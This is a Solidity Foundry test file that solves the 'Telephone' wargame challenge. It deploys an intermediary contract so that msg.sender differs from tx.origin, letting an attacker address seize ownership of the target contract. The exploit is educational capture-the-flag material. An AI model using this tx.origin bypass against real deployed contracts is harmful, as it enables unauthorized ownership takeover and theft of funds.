// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import {Telephone} from "../src/Telephone.sol";

contract Caller {
    Telephone telephone;

    constructor(address _telephoneAddress) {
        telephone = Telephone(_telephoneAddress);
    }

    function callChangeOwner(address _owner) public {
        telephone.changeOwner(_owner);
    }
}

contract TelephoneExploitTest is Test {
    Telephone public target;
    address constant OWNER = address(0xCAFE);
    address constant ATTACKER = address(0xBEEF);

    function setUp() public {
        vm.prank(OWNER);
        target = new Telephone();

        vm.deal(ATTACKER, 1 ether); 
    }

    // === This will work because foundry use a default msg.sender different from tx.origin ===
    // function testExploit() public {
    //     vm.prank(ATTACKER);
    //     target.changeOwner(ATTACKER); 
    //     assertEq(target.owner(), ATTACKER, "Attacker is not the owner");
    // }
    // ==== But we want to use a real solution and to not cheat by using the foundry behavior ====

    function testExploit() public {
        Caller caller = new Caller(address(target));
        vm.prank(ATTACKER);
        caller.callChangeOwner(ATTACKER);
        assertEq(target.owner(), ATTACKER, "Attacker is not the owner");
    }
}